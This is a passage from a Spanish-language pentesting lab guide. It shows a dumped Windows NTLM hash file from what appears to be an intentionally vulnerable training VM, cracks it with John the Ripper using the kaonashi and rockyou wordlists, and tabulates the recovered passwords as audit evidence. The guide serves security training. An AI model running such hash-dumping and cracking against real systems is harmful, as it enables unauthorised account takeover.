- Verificar archivo `hashes.txt`:

```bash
cat hashes.txt               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
*disabled* sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
```

- Limpiar Archivos Previos de John the Ripper

```bash
rm ~/.john/john.pot
```

- Usar un Diccionario Específico para el crackeo de contraseñas

  - Primero utilizaremos el diccionario `kaonashi14M.txt`.
  ```bash
  john --format=NT --wordlist=diccionarios/kaonashi14M.txt hashes.txt  
  Using default input encoding: UTF-8
  Loaded 18 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
  Warning: no OpenMP support for this hash type, consider --fork=2
  Press 'q' or Ctrl-C to abort, almost any other key for status
  vagrant          (Administrator)     
  pr0t0c0l         (c_three_pio)     
                  (*disabled* Guest)     
  mandalorian1     (boba_fett)     
  4g 0:00:00:00 DONE (2024-11-04 10:24) 6.451g/s 23136Kp/s 23136Kc/s 347569KC/s melinecat..melena23
  Warning: passwords printed above might not be all those cracked
  Use the "--show --format=NT" options to display all of the cracked passwords reliably
  Session completed. 
  ```
  - Pero también podíamos haber utilizado otro diccionario (`rockyou.txt`):

  ```bash
  john --format=NT --wordlist=diccionarios/rockyou.txt hashes.txt     
  Using default input encoding: UTF-8
  Loaded 18 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
  Warning: no OpenMP support for this hash type, consider --fork=2
  Press 'q' or Ctrl-C to abort, almost any other key for status
                  (*disabled* Guest)     
  vagrant          (Administrator)     
  pr0t0c0l         (c_three_pio)     
  3g 0:00:00:00 DONE (2024-11-04 10:24) 5.172g/s 24730Kp/s 24730Kc/s 379002KC/s  Ttwwl789..*7¡Vamos!
  Warning: passwords printed above might not be all those cracked
  Use the "--show --format=NT" options to display all of the cracked passwords reliably
  Session completed. 
  ```

- Lista de usuarios encontrados (que irán al reporte de la auditoría) y que serán presentados como evidencia.

| Usuario       | Contraseña        |
|---------------|-------------------|
| Administrator | vagrant           |
| c_three_pio   | pr0t0c0l          |
| boba_fett     | mandalorian1      |

### 2.7. Requisitos de Documentación

- Documentar en su respectivo blog.

- Para cada paso, proporciona capturas de pantalla y explica en tus propias palabras qué estás haciendo y por qué es relevante en un proceso de auditoría de seguridad.

- Asegúrate de usar herramientas comunes en entornos de pentesting (por ejemplo, **Nmap**, **Metasploit**, **samdump2**, **John the Ripper**).

- **Tip**: Asegúrate de capturar cada paso clave con capturas de pantalla y explica en tu blog lo que hace cada comando o herramienta.

<!-- - **Consejo**: Piensa en cómo documentarías el proceso para que alguien sin conocimientos previos entienda tu flujo de trabajo. Enfócate en los objetivos y en el impacto de cada paso dentro del proceso de auditoría de seguridad -->